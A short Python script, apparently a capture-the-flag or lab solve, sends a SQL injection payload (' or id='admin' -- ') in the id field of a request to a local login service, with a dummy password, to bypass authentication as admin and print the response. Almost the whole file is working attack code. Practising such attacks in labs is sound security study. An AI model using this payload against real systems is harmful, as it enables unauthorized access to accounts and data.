import requests

r = requests.get("http://127.0.0.1:20203", params={"id":"' or id='admin' -- '", "pw":"asd"})
print(r.text[:r.text.find("}")+1])
